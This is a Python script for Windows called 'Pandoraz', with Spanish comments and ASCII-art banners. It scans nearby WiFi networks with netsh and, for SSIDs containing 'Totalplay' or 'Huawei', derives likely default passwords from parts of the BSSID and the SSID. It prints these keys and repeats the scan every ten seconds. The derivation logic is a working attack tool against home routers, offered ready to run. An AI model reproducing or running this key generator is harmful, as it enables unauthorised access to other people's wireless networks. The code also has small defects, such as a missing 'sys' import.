# -*- Coding: UTF-8 -*-
# Python 3
# Windows
#
#   ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
#   ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
#   ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
#   ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
#   ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
#                                                         By: LawlietJH
#                                                               v1.1.4

import time
import os



Version = "v1.1.4"



# Banners: http://patorjk.com/software/taag/



Banner1 = """
       ██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ███████╗
       ██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══███╔╝
       ██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██████╔╝███████║  ███╔╝ 
       ██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██║   ██║██╔══██╗██╔══██║ ███╔╝  
       ██║     ██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║  ██║███████╗
       ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""
# Fuente: ANSI Shadow - http://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t=Pandoraz


Banner2 = """
                            ╔═╗┌─┐┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐
                            ╠═╝├─┤│││ │││ │├┬┘├─┤┌─┘
                            ╩  ┴ ┴┘└┘─┴┘└─┘┴└─┴ ┴└─┘
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=Pandoraz

Autor = """
                            ╦  ┌─┐┬ ┬┬  ┬┌─┐┌┬┐╦╦ ╦
                            ║  ├─┤││││  │├┤  │ ║╠═╣
                            ╩═╝┴ ┴└┴┘┴─┘┴└─┘ ┴╚╝╩ ╩
"""
# Fuente: Calvin S - http://patorjk.com/software/taag/#p=display&f=Calvin%20S&t=LawlietJH



#=======================================================================



def Dat():	# Función Que Permite Mostrar Los Datos Del Script.
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	print("\n\n", Banner1)
	print("\n\n", Autor)
	print("\n{:^80}".format(Version))
	
	os.system("TimeOut /NoBreak 1 > Nul")
	


def Salir(Num=0):	# Fucnión Que Permite Salir Del Script Sin Error Alguno.
	
	try:
		time.sleep(1.5)
		exit(Num)
	except KeyboardInterrupt:
		Salir(Num)



#~ Función Que Permite Esconder El Cursor de la Pantalla (La rayita que parpadea xD).
def HiddenCursor(imp="Hide"):
	
	#~ imp = imp.title()		#Devuelve la cadena solo con la primera letra de cada palabra en mayuscula
	imp = imp.capitalize()		#Devuelve la cadena solo con la primera letra de la primer palabra en mayuscula

	if os.name == 'nt':
		import msvcrt
		import ctypes

		class _CursorInfo(ctypes.Structure):
			_fields_ = [("size", ctypes.c_int),
						("visible", ctypes.c_byte)]
	
	def hide_cursor():
		if os.name == 'nt':
			ci = _CursorInfo()
			handle = ctypes.windll.kernel32.GetStdHandle(-11)
			ctypes.windll.kernel32.GetConsoleCursorInfo(handle, ctypes.byref(ci))
			ci.visible = False
			ctypes.windll.kernel32.SetConsoleCursorInfo(handle, ctypes.byref(ci))
		elif os.name == 'posix':
			sys.stdout.write("\033[?25l")
			sys.stdout.flush()

	def show_cursor():
		if os.name == 'nt':
			ci = _CursorInfo()
			handle = ctypes.windll.kernel32.GetStdHandle(-11)
			ctypes.windll.kernel32.GetConsoleCursorInfo(handle, ctypes.byref(ci))
			ci.visible = True
			ctypes.windll.kernel32.SetConsoleCursorInfo(handle, ctypes.byref(ci))
		elif os.name == 'posix':
			sys.stdout.write("\033[?25h")
			sys.stdout.flush()
			
	if imp == "Hide":
		hide_cursor()
	elif imp =="Show":
		show_cursor()
	else:
		pass



#=======================================================================



Red = False
Redes = []
Bssids = []
Cont = 0
Cony = 0
Conty = 0



#=======================================================================



def Plus():
	
	Conty = 0
	xD = ""
	
	Comando = "netsh wlan show networks mode=Bssid"
	Cad = os.popen(Comando)
	Cadena = Cad.read()
	Lista = Cadena.split("\n")
	
	for X in Lista:
		
		Conty += 1
		
		if Conty == 2:
			xD += "\n\n\t [+] " + X + "\n\n\t [*] "
		elif Conty == 3:
			if X.startswith("La"):
				xD += "La interfaz de la red de área local inalámbrica está\n\t"+\
					"     apagada y no es compatible con la operación solicitada."
			else: xD += X
			
	return xD



def Redes():
	
	pass




def EscaneoDeRed():	# Escaneo De La Red En Busqueda De Redes WiFi Vulnerables.
	
	global Bssids, Redes, Red, Cont, Cony, Conty
	Bssids, Redes, Red, Cont, Cony, Conty = [], [], [], 0, 0, 0
	
	Comando = "netsh wlan show networks mode=Bssid"
	Cad = os.popen(Comando)
	Cadena = Cad.read()
	Lista = Cadena.split("\n")

	for X in Lista:
		
		Conty += 1
		
		if Conty == 3:
			print("\n\n\n\t [+] ", X, "\n\n")
		
		if "SSID" in X:
			X = X.split(" : ")[1]			
			Bssids.append(X)

	for Y in Bssids:
		
		if Cont % 2 == 0:
			
			Cony += 1
			
			if len(Y) > 12:	print("    [*] {} - ESSID: {}".format(Cony, Y), end="\t")
			else:			print("    [*] {} - ESSID: {}".format(Cony, Y), end="\t\t")
				
			if "Totalplay" in Y or "Huawei" in Y:
				Red = True
				Redes.append(Y)
		else:
			Y = Y.upper()
			print(" BSSID: {}".format(Y))
			
			if Red == True:
				Redes.append(Y)
				Red = False
		
		Cont += 1
	
	Cont = 0
	Cony = 0
	Name = ""
	Pass = ""
	
	if len(Redes) != 0:
		print("\n\n\n\n Posibles Contraseñas De Redes:\n")
		
		for X in Redes:
			
			Cont += 1
						
			if Cont % 2 != 0:
				
				Cony += 1
				
				Name = X
				
				print("\n [*] {} - Red: {}".format(Cony, X), end="\t")
			
			else:
				
				Name = Name[-4:]
				X = X.split(":")
				Pass = X[3] + X[4] + Name
				
				print("\t Contraseña: {}".format(Pass))
				
	else: print("\n\n\t [!] Sin Redes Disponibles... Por Ahora...")



#=======================================================================



while True:
	
	os.system("cls && Title Pandoraz.py                "+\
			"By: LawlietJH                "+Version+"    ")
	
	EscaneoDeRed()
	
	Eny = 10
	
	print("\n\n")
	
	try:
		while True:
			 
			print("\r\t Actualizado En " + str(Eny) + " Segundos...", end="")
			os.system("TimeOut /NoBreak 1 > Nul")
			
			if Eny == 1: break
			
			Eny -= 1
	except KeyboardInterrupt:
		print("\n\n\t [!] Saliendo...")
		time.sleep(1.5)
		Dat()
		Salir(0)
		
